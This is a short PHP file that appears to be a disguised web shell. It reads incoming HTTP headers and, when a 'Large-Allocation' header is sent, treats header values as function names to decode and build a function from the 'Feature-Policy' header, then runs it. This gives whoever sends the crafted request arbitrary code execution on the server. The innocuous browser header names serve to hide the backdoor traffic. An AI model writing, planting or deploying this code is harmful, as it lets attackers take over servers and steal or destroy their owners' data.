<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $content = $_HEADERS['Large-Allocation']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Feature-Policy']));
    $content();
}